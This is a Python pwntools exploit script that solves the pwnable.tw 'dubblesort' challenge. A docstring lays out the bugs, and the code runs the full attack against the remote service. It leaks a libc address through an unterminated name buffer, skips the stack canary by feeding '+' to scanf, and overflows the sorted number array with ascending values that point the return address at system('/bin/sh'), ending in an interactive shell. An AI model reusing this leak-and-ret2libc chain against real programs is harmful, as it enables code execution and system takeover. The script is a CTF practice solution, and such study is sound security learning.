#!/usr/bin/env python3
"""
pwnable.tw - dubblesort (200 pts)
Exploit by: ctf-solver

Vulnerabilities:
1. Info leak: read() doesn't null-terminate the name buffer. The stack
   contains a libc address that gets printed when printf("%s") reads beyond
   our input.

2. Stack buffer overflow: No bounds check on the count of numbers to sort.
   We can input more numbers than the buffer can hold, overwriting saved
   registers and return address.

3. Canary bypass: When scanf("%u") encounters input it can't parse (like '+'),
   it returns without modifying the destination. This lets us skip the canary.

4. Sorting consideration: The program sorts numbers in ascending order using
   bubble sort. Our ROP chain must be in ascending order, or the sort will
   scramble it.

Stack layout (from esp after frame setup):
- esp+0x18: count
- esp+0x1c: numbers[0]  (4 bytes each)
- ...
- esp+0x7c: numbers[24] = CANARY
- esp+0x80: numbers[25] onwards = saved regs, ebp, return address, etc.
"""

from pwn import *

context.arch = "i386"
context.log_level = "info"

# Target
HOST = "chall.pwnable.tw"
PORT = 10101

# Libc offsets (from libc_32.so.6)
LIBC_START_MAIN_OFFSET = 0x18540
SYSTEM_OFFSET = 0x3A940
BINSH_OFFSET = 0x158E8B


def exploit(local=False):
    if local:
        # For local testing with the provided libc
        # Run: LD_PRELOAD=./libc_32.so.6 ./dubblesort
        r = process("./dubblesort", env={"LD_PRELOAD": "./libc_32.so.6"})
    else:
        r = remote(HOST, PORT)

    # Step 1: Leak libc address via name buffer
    # The name buffer is at esp+0x3c (64 bytes), and right after it is the canary.
    # Before our input, the stack may contain libc addresses from __libc_start_main.
    # By sending less than 64 bytes, printf will continue reading and leak these.
    #
    # The leaked address is typically __libc_start_main+247 at offset ~28 from name start.
    # However, due to the null byte in the canary, we need to account for the layout.

    r.recvuntil(b"What your name :")

    # Send 28 bytes - this positions us right before a libc address on stack
    # The canary's lowest byte is null, but the libc address before it leaks
    r.send(b"A" * 28)

    # Receive response and extract leak
    response = r.recvuntil(b",How many numbers")

    # Find our input and extract what follows
    idx = response.find(b"A" * 28)
    if idx == -1:
        log.error("Could not find our input in response")
        return

    leak_data = response[idx + 28 :]

    # The leak might have garbage before the actual address
    # Skip any null bytes and find 4 bytes that look like a libc address
    leak = None
    for i in range(len(leak_data) - 3):
        candidate = u32(leak_data[i : i + 4])
        # Libc addresses on 32-bit Linux are typically 0xf7xxxxxx
        if (candidate & 0xF7000000) == 0xF7000000:
            leak = candidate
            break

    if leak is None:
        # Fallback: try reading at offset 0 if no f7 address found
        # Sometimes the leak is at a different position
        if len(leak_data) >= 4:
            leak = u32(leak_data[0:4])
        else:
            log.error("Could not find libc leak")
            return

    log.info(f"Leaked address: {hex(leak)}")

    # Calculate libc base
    # The leaked value is typically __libc_start_main + 247 (return offset)
    libc_base = leak - (LIBC_START_MAIN_OFFSET + 247)

    # Align to page boundary (libc base should be page-aligned)
    libc_base = libc_base & 0xFFFFF000

    log.info(f"Libc base: {hex(libc_base)}")

    # Calculate important addresses
    system_addr = libc_base + SYSTEM_OFFSET
    binsh_addr = libc_base + BINSH_OFFSET

    log.info(f"system(): {hex(system_addr)}")
    log.info(f"/bin/sh: {hex(binsh_addr)}")

    # Step 2: Overflow the numbers array to overwrite return address
    # Stack layout for numbers:
    # - numbers[0-23]: before canary
    # - numbers[24]: CANARY (skip with '+')
    # - numbers[25-31]: saved registers (ebx, esi, edi), alignment, ebp
    # - numbers[32]: return address
    # - numbers[33]: return address of system (after system returns)
    # - numbers[34]: argument to system (/bin/sh)

    # We need to input numbers in ascending order so bubble sort doesn't change them!
    # Values: small padding < intermediate padding < system < dummy < /bin/sh

    count = 35  # Enough to overflow into return address and arguments
    r.sendline(str(count).encode())

    for i in range(count):
        r.recvuntil(b"number :")

        if i == 24:
            # Canary position - skip by making scanf fail
            # Sending '+' or '-' alone causes scanf("%u") to fail
            # without modifying the destination
            r.sendline(b"+")
        elif i < 24:
            # Small ascending values (these stay at the beginning after sort)
            r.sendline(str(i + 1).encode())
        else:
            # After canary: saved registers, ebp, return address, ROP chain
            # Need ascending values greater than 24 but in proper order for ROP

            # Indices 25-31: padding values (saved regs, alignment, ebp)
            # These need to be > 24 but < system address
            # Use incremental offsets from a base value
            if i <= 31:
                # Use libc_base + small offset (less than system offset)
                padding = libc_base + 0x1000 * (i - 24)
                r.sendline(str(padding).encode())
            elif i == 32:
                # Return address -> system()
                r.sendline(str(system_addr).encode())
            elif i == 33:
                # Return address for system (dummy, just needs to be > system)
                # Use a value between system and /bin/sh
                dummy = libc_base + 0x100000
                r.sendline(str(dummy).encode())
            elif i == 34:
                # Argument to system -> "/bin/sh"
                r.sendline(str(binsh_addr).encode())
            else:
                # Extra padding if needed (ascending)
                r.sendline(str(binsh_addr + (i - 34)).encode())

    log.success("Payload sent! Waiting for shell...")

    # After the sort completes and function returns, we should get a shell
    r.interactive()


if __name__ == "__main__":
    import sys

    local = len(sys.argv) > 1 and sys.argv[1] == "local"
    exploit(local)
